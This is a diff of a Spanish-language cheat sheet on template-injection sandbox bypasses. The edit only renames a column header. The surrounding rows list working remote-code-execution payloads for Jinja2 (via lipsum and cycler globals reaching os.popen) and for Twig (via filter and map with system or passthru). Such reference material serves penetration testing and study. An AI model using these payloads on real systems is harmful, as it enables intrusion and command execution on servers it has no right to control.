@@ -20,7 +20,7 @@ linked:
 
 ## Jinja2 Sandbox Bypass
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `{{lipsum.__globals__.os.popen('id').read()}}` | RCE via helper Flask `lipsum` | SandboxedEnvironment con lipsum no filtrado. |
 | `{{cycler.__init__.__globals__.os.popen('id').read()}}` | RCE via cycler helper | Helper Jinja2. |
@@ -47,7 +47,7 @@ linked:
 
 ## Twig Sandbox Bypass
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `{{['id']\|filter('system')}}` | RCE via filter callback | Twig sandbox con filter() permitido. |
 | `{{['id']\|map('passthru')\|join('')}}` | RCE via map filter callback | Map permitido. |
